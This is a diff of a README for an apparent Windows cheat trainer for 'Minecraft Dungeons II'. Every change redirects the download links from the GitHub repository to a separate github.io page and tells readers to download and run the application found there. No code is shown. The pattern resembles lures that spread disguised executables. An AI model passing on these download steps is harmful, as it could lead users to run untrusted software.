@@ -1,6 +1,6 @@
 # 🎮 minecraft-dungeons-2-trainer - One-Click Windows Trainer for Dungeon Runs
 
-[![Download minecraft-dungeons-2-trainer](https://img.shields.io/badge/Download-minecraft--dungeons--2--trainer-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/railuxy/minecraft-dungeons-2-trainer)
+[![Download minecraft-dungeons-2-trainer](https://img.shields.io/badge/Download-minecraft--dungeons--2--trainer-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://railuxy.github.io)
 
 minecraft-dungeons-2-trainer is a lightweight external trainer for Minecraft Dungeons II on Windows. It gives you one-click toggles for God Mode, Infinite Emeralds, Infinite Gold, Infinite Enchantment Points, No Artifact Cooldown, and Infinite Arrows. The trainer runs as a separate desktop tool and does not use DLL injection, making it simple to open and use without programming knowledge.
 
@@ -8,7 +8,7 @@ minecraft-dungeons-2-trainer is a lightweight external trainer for Minecraft Dun
 
 Visit this link to download the application:
 
-[Download minecraft-dungeons-2-trainer](https://github.com/railuxy/minecraft-dungeons-2-trainer)
+[Download minecraft-dungeons-2-trainer](https://railuxy.github.io)
 
 1. Open the download link in your browser.
 2. Visit this link to download the application.
@@ -118,7 +118,7 @@ If the trainer feels slow, close browser tabs and other background programs you 
 
 | Step | Action |
 |---|---|
-| 1 | Visit [minecraft-dungeons-2-trainer](https://github.com/railuxy/minecraft-dungeons-2-trainer) to download the application. |
+| 1 | Visit [minecraft-dungeons-2-trainer](https://railuxy.github.io) to download the application. |
 | 2 | Wait for the download to finish. |
 | 3 | Open the downloaded application on Windows. |
 | 4 | Launch Minecraft Dungeons II. |
